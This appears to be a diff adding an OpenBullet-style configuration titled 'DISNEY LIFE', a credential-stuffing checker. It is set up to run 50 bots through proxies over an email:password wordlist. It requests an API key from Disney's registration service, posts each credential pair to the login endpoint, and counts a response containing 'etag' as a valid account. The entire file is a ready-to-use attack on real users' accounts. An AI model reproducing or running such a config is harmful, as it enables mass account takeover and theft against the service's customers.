@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "DISNEY LIFE",
+  "SuggestedBots": 50,
+  "LastModified": "2018-09-02T18:47:16.132711+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_API_KEY REQUEST POST "https://registerdisney.go.com/jgc/v6/client/WDI-DISNEYLIFE.WEB-PROD/api-key?langPref=en-UK" AutoRedirect=TRUE 
+  CONTENT "null" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "expires: -1" 
+  HEADER "conversation-id: 16807cda-c4a7-42f4-bbb2-4f2ac74c8f7c" 
+  HEADER "correlation-id: 73bc07e2-e7fe-4552-86b7-2f0f1aea3dc6" 
+#PARSE_API_KEY PARSE "<HEADERS(api-key)>" LR "" "" Recursive=FALSE -> VAR "APIKEY" "" "" 
+#POST_LOGIN REQUEST POST "https://ha.registerdisney.go.com/jgc/v6/client/WDI-DISNEYLIFE.WEB-PROD/guest/login?langPref=en-UK" AutoRedirect=TRUE 
+  CONTENT "{\"loginValue\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "expires: -1" 
+  HEADER "conversation-id: 16807cda-c4a7-42f4-bbb2-4f2ac74c8f7c" 
+  HEADER "correlation-id: 73bc07e2-e7fe-4552-86b7-2f0f1aea3dc6" 
+  HEADER "authorization: APIKEY <APIKEY>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "etag" 
+  KEYCHAIN Success OR 
+    KEY "etag" 
